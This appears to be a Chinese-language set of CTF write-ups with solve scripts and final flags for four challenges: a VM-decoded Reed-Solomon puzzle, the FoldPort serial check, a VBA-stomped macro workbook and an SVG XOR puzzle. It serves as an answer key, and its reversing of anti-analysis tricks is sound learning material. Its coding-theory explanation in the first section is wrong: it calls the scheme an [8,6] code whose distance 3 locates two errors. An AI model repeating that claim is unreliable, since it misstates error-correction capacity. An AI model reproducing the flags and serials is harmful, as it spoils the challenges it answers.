RVA 0x1f688 处的 WIT8RS01 数据块（0x1960 字节）包含 8 个 worker，每个 0x31c 字节：身份信息、滚动解码密钥、64 字节操作码置换、708（177×4）字节指令。第 p 个指令字节解码为 `plain[p] = cipher[p] XOR fold8(key)` ，密钥更新 `key = ROL32(key,7) + (p ^ 0x9e3779b9) mod 2^32` 。解码器在 RVA 0x4220，VM 执行器在 0x3a20，GF(256) 乘法在 0x3df0，约简多项式 0x11b。八份证词对同一物理页给出八条独立线性方程，构成可纠错的冗余视角。

### 解题过程

对寄存器做仿射符号执行，消去寄存器复制、异或常数和有限域乘法。每列 j 归一化为 P_j(x) = y\[j\] + x·y\[j+8\] + x²·y\[j+16\] + x³·y\[j+24\]，加法 XOR、乘法 GF(256)，x 取 worker_id+1。每列八个取值中六个正确两个被改动，构成 \[8,6\] Reed-Solomon 型纠错：枚举 C(8,4)=70 个四点子集做有限域高斯消元，保留至少匹配六份证词的唯一解。纠错结果与每份证词改两处的题面约束吻合（worker0 错列 0,4；worker1 错列 0,5；worker2 错列 1,4……）。解出中间状态后逆转输入预处理（SSE 字节置换 a4→Mode，30B→32B ARX 10 轮）得 30 字节原话。

验收条件是唯一性的保证：解出的系数回代 8 个 worker 要求至少 6 份一致。只要求 4 份会混进伪解，6 份门槛让每个错误列的定位有两个独立来源交叉确认——8 个 worker 两处错误共 16 个错误位，每列 8 值中错 2 个，\[8,6\] 码最小距离 3 恰好支撑单列双错定位。

### 解题脚本

```python
MUL = [bytes(gf_mul(a, b) for b in range(256)) for a in range(256)]
INV = [0] + [MUL[a].index(1) for a in range(1, 256)]

def gauss(rows):
    a = [list(r) for r in rows]
    for k in range(len(a)):
        p = next((j for j in range(k, len(a)) if a[j][k]), None)
        if p is None:
            return None
        a[k], a[p] = a[p], a[k]
        a[k] = [MUL[INV[a[k][k]]][x] for x in a[k]]
        for j in range(len(a)):
            if j != k:
                t = MUL[a[j][k]]
                a[j] = [x ^ t[y] for x, y in zip(a[j], a[k])]
    return tuple(r[-1] for r in a)
```

把 flag 回喂发布程序验证： `'flag{utyzn4pgv6bvlilpasoq3o5s}' | ./consensus_maze.exe` → stdout: ok，rc=0。

### flag

```plain
flag{utyzn4pgv6bvlilpasoq3o5s}
```

* * *

## Reverse · 折叠端口（300）

### 题目描述

附件 FoldPort.exe（PE32+ x86-64 GUI 自校验）。Serial 校验藏在 IOCP 多线程调度、动态代码与向量化异常流程里，输入正确的 Username 与 Serial 才能通过校验。

### 解题思路

校验入口是 `--self-test <User> <Serial>` 。Serial 须 64 位大写十六进制（小写被拒），解码为 8 个小端 u32 注入第 0 层端口 0..7，成功判据是第 80 层 8 个出口累加器全零。折叠网络是双射，这个判据锁死 Serial 唯一性。用户名取题面退役管理员日志里的 CTF。网络规模：端口 648 = 81 层×8 通道，单元 320 = 80 层×4；每层配对掩码循环取 \[1,2,4,2,1\]；单元映射 (a,b) → (b, a^P_U(b)) 使整网可逆，由 V\[80\]=0 逐层反推即唯一 Serial。每单元轮参数由 D = SHA256("FOLDPORT-MATERIAL-V1" || username || uint16_le(unit_id)) 派生，整条派生链不依赖运行时环境，Serial 可完全离线计算。

### 解题过程

分析难度不在密码结构而在抗分析外壳：执行流被 IOCP 打散到线程池，轮函数微指令通过向量化异常动态派发。破局用 Unicorn 模拟执行代替人工拼接，把 FUN_140005300（微指令 ALU）和 FUN_1400058D0（轮函数组合）当纯函数抽出来，同一组输入分别跑二进制原码与 Python 重写版逐单元对拍，320 单元 × 3 输入 = 960 次全等后 Python 模型视为可信。逆推从 32 字节全零目标开始，Feistel 逆变换 (L',R') → (R' ^ F(L'), L')，按第 79 层到第 0 层回推再按小端编码为大写 hex。验证四重：Unicorn 对拍 960/960 全等、反演表与 FUN_1400069d0 生成结果逐字节一致、二进制自身驱动 320 单元跑完 80 层 8 出口全 0、二进制接受该串并解出预期 32 字节。原附件执行前后 SHA-256 一致。

### 解题脚本

```python
def invert(state):
    for layer in range(79, -1, -1):
        mask = [1, 2, 4, 2, 1][layer % 5]
        for i in range(8):
            if i & mask == 0 and (i ^ mask) > i:
                a, b = state[i], state[i ^ mask]
                state[i], state[i ^ mask] = b, a ^ F(layer, i ^ mask, b)
    return state
```

### flag

题面未给 flag 包装格式，直接给出经原程序验证的 Serial（Username: CTF）：

```plain
99862E7DE2FB974AE1080F02738ADE66E7453381CAC9E6FBA0E918ED170DBBD1
```

* * *

## Misc · 宏安全审计（100）

### 题目描述

附件是一个宏启用工作簿（xlsm）。文档里看得见的 VBA 源码声称审计已经通过，但历史缓存、结构化审计记录和源码结论互相矛盾，要求不启用宏、不执行任何未知代码做静态分析，恢复真正的 flag。

### 解题思路

olevba 报 `VBA Stomping was detected: the VBA source code and P-code are different` ——p-code 实际只有 `MsgBox "Hello from Python!"` ，可见源码的"审计通过"结论（flag{vba_source_is_trusted}，Base64 又埋一遍）是写入源码层的诱饵，运行的是另一份代码。真 flag 藏在工作簿的五个物理槽位里，拼装顺序由 vbaCache.bin 里的一段微程序算出来，解密算法写在 VBA 注释里。

### 解题过程

xlsm 当 zip 拆开，五个槽位分散在：docProps/core.xml 注释（AUD0，Base64）、sheet1.xml 注释（AUD1，hex）、workbook.xml 注释（AUD2，逗号十进制）、vbaProject.bin 的 OLE 工程字节后（CTFSLOT3 标记 + u16be 长度）、xl/embeddings/vbaCache.bin（final-slot）。vbaCache.bin 头解析为 VBCS 魔数、版本 01、75e8 的顺序 CRC16、473d22e8 的密文 CRC32、002a 的程序长度（42 字节）、栈程序、0007 的 final-slot。42 字节栈 VM 只认 OpPush8/OpXor/OpEmit/OpSetAcc32/OpXorAcc32/OpExportAcc/OpHalt 七个操作码，反汇编是五组 push-push-xor-emit 的整齐模式，emit 出的真顺序 \[3,1,4,0,2\] 与隐藏表 sheet2 写的 0,1,2,3,4 对着干。CRC16/CRC32 双校验通过后拼接与顺序锁定。

解密用 `UndoCacheByte(v,state) = ROR(v,(state>>8)&7) ^ (state&0xFF)` ，每字节后推进 CacheState（XOR 自乘 0x2000 / 自除 0x20000 / 自乘 0x20）。种子恢复靠 UndoCacheByte 行为由 state 低 11 位完全决定：明文首字节 f（0x66）把低 11 位约束到 8 种可能（对应 8 种移位位数），高 21 位共 2097152 种暴力枚举，第二个字节须解出 l（0x6c）把候选压到唯一，得种子 0x40aec71f。反证：48 组变体（位移/乘数/rol-ror/xor 取位/推进时机）穷举唯此一组合命中 flag{。

### 解题脚本

```python
def recover_seed(ct, known=b"flag{"):
    for state_high in range(1 << 21):
        for shift in range(8):
            st = (shift << 8) | (known[0] ^ ct[0])
            out, s = [], st
            ok = True
            for i, c in enumerate(ct):
                b = ror_byte(c, (s >> 8) & 7) ^ (s & 0xFF)
                if i < len(known) and b != known[i]:
                    ok = False
                    break
                out.append(b)
                s = cache_state(s)
            if ok:
                return st, bytes(out)
```

### flag

```plain
flag{what_runs_is_not_what_you_read}
```

* * *

## Misc · Vector Secrets（200）

### 题目描述

附件只有一个 poster.svg（约 155 KB）。题面说明海报中没有隐藏文本，渲染器所需的一切都已存在，要求不执行脚本、不依赖截图或 OCR，从 SVG 的几何关系中恢复 flag。

### 解题思路

SVG 无 text、无注释、无 metadata，纯几何。根节点 1024×768 画布，defs 里定义 232 个 symbol（asset_000 到 asset_231，每个含 8 个 5×5 小矩形点）和 232 个 clipPath（mask_000 到 mask_231，各含一个窄条带矩形），文档主体 232 个形状帧全被一张铺满画布的不透明背景矩形盖住，正常渲染什么都看不到。可见性判定建立在坐标约定上：SVG 无 viewBox 且 clipPathUnits 是 userSpaceOnUse，点与裁剪条同处局部坐标系，直接看点矩形与裁剪条是否相交。

### 解题过程

统计下来 232 帧里 230 帧恰好可见 6 个点（每帧左右各一个落在条带外的诱饵点）。XOR 消噪的前提是真信号点在不同帧里出现奇数次、噪声点偶数次，对 5px 栅格单元统计覆盖次数的奇偶等价于把 232 帧做按位异或，重叠噪声互相抵消。实测 230 帧各贡献 6 个可见点共 1380 点，最终位图只有 166×7=1162 格子的一部分被点亮，重叠率接近 84%，没有 XOR 直接叠加完全不可读。XOR 后得到 166 列×7 行点阵位图（起点 (90,405)，落在海报中间高亮 band），按整列空白切分字符、与内置 5x7 字库逐格匹配（先精确匹配再取汉明距离），读出 FLAG{XOR_SHAPES_REVEAL_FLAG}。18 个不同字形与 18 个不同字符一一对应无冲突，这个自洽性检查是独立于字库质量的完整性验证。字库只有大写而平台要求小写，转换发生在提交层。

### 解题脚本

```python
parity = defaultdict(int)
for frame in frames:
    for (gx, gy) in visible_grid_cells(frame):
        parity[(gx, gy)] ^= 1
bitmap = {k for k, v in parity.items() if v}
```

### flag

```plain
flag{xor_shapes_reveal_flag}
```
